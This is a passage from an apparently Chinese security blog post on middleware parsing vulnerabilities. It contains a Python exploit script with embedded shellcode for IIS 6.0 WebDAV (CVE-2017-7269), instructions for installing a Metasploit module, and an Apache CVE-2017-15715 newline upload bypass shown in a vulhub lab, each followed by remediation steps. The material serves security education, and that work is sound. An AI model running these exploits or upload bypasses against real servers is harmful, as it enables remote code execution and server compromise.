class=\"symbol\">\\x</span>a2<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>8e<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>ab<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>8e<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>a6<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>9a<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bc<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bc<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>8e<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>a6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e2<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>cc<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>be<span class=\"symbol\">\\x</span>ef<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>ef<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>d1<span class=\"symbol\">\\x</span>ae<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>ae<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e2<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e9<span class=\"symbol\">\\x</span>8e<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>ae<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>ab<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>ab<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>9c<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9c<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e2<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>81'</span><br><span class=\"line\">    shellcodespan><br><span class=\"line\">    pay+=shellcode</span><br><span class=\"line\">    pay+='&gt;<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span><span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>'</span><br><span class=\"line\">    return pay</span><br><span class=\"line\"></span><br><span class=\"line\">def send_pack(ip,port=80) :</span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.connect((ip,port))</span><br><span class=\"line\">    time_tick=time.time()</span><br><span class=\"line\">    sock.send(generate_payload(str(port)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    try :</span><br><span class=\"line\">        data = sock.recv(80960)  </span><br><span class=\"line\">    except :</span><br><span class=\"line\">        pass</span><br><span class=\"line\">    </span><br><span class=\"line\">    print data</span><br><span class=\"line\">    </span><br><span class=\"line\">    sock.close()</span><br><span class=\"line\">    </span><br><span class=\"line\">    if not -1==data.find('HHIT CVE-2017-7269 Success') :</span><br><span class=\"line\">        return True</span><br><span class=\"line\">    </span><br><span class=\"line\">    return False</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">if 2==len(sys.argv) :</span><br><span class=\"line\">    print send_pack(sys.argv[1])</span><br><span class=\"line\">else :</span><br><span class=\"line\">    print send_pack(sys.argv[1],int(sys.argv[2]))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/005_1.png\" alt=\"005_1\"></p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p><code>https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2</code></p>\n<p>将上面的<code>cve-2017-7269.rb</code>拷贝到kali的<code>/usr/share/metasploit-framework/modules/exploits/windows/iis</code>下</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/005_2.png\" alt=\"005_2\"></p>\n<h3 id=\"修复方式-1\"><a href=\"#修复方式-1\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><ol>\n<li>由于微软已不再对Windows Server 2003提供支持，建议禁用webDAV功能。</li>\n<li>升级到最新系统 Windows Server 2016。</li>\n</ol>\n<h1 id=\"Apache相关\"><a href=\"#Apache相关\" class=\"headerlink\" title=\"Apache相关\"></a>Apache相关</h1><h2 id=\"Apache-HTTPD-换行解析漏洞（CVE-2017-15715）\"><a href=\"#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）\" class=\"headerlink\" title=\"Apache HTTPD 换行解析漏洞（CVE-2017-15715）\"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>环境采用vulhub的<code>/httpd/CVE-2017-15715</code></p>\n<h3 id=\"漏洞原理-4\"><a href=\"#漏洞原理-4\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>Apache版本在2.4.0到2.4.29</p>\n<p>正则中的<code>$</code>不仅可以匹配行尾,如果设置了 RegExp 对象的 Multiline 属性，则 <code>$</code>也匹配 ‘\\n’ 或 ‘\\r’。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \\.php$&gt;</span></span><br><span class=\"line\">        <span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>因此16进制的换行符能被<code>$</code>匹配从而被PHP解析。</p>\n<h3 id=\"实践过程\"><a href=\"#实践过程\" class=\"headerlink\" title=\"实践过程\"></a>实践过程</h3><p>可以利用到文件上传中来绕过黑名单,在Apache版本(2.4.0到2.4.29)中上传的<code>info.php%0A</code>文件又能被解析,即可getshell。</p>\n<p>这个docker环境没有前端代码的,加一个</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#upload.html</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CVE-2017-15715<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">'file'</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"upload\"</span>&gt;</span></span><br><span class=\"line\">\t    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#index.php</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = basename(<span class=\"variable\">$_POST</span>[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = pathinfo(<span class=\"variable\">$name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$ext</span>, [<span class=\"string\">'php'</span>, <span class=\"string\">'php3'</span>, <span class=\"string\">'php4'</span>, <span class=\"string\">'php5'</span>, <span class=\"string\">'phtml'</span>, <span class=\"string\">'pht'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'bad file'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'./'</span> . <span class=\"variable\">$name</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接上传php文件会被exit,现在将上传的文件名修改成<code>info.php%0a</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_1.png\" alt=\"003_1\"></p>\n<p>已经上传成功</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_2.png\" alt=\"003_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_3.png\" alt=\"003_3\"></p>\n<p>确实是存在解析漏洞的。</p>\n<p>windows操作系统不允许后缀以换行符结尾的文件命名方式，创建文件会失败，所以还是比较鸡肋的。</p>\n<h3 id=\"修复方式-2\"><a href=\"#修复方式-2\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>获取文件名时用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>,它会将换行符号自动去除。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"comment\">#$name = basename($_POST['name']);</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = pathinfo(<span class=\"variable\">$name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$ext</span>, [<span class=\"string\">'php'</span>, <span class=\"string\">'php3'</span>, <span class=\"string\">'php4'</span>, <span class=\"string\">'php5'</span>, <span class=\"string\">'phtml'</span>, <span class=\"string\">'pht'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'bad file'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'file'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'./'</span> . <span class=\"variable\">$name</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/003_4.png\" alt=\"003_4\"></p>\n<p>可以看到上传失败了。</p>\n<ol>\n<li>上传文件功能配合白名单为过滤条件 </li>\n<li>上传文件目录限制脚本执行权限</li>\n</ol>\n<h2 id=\"Apache-HTTPD-未知后缀解析漏洞\"><a 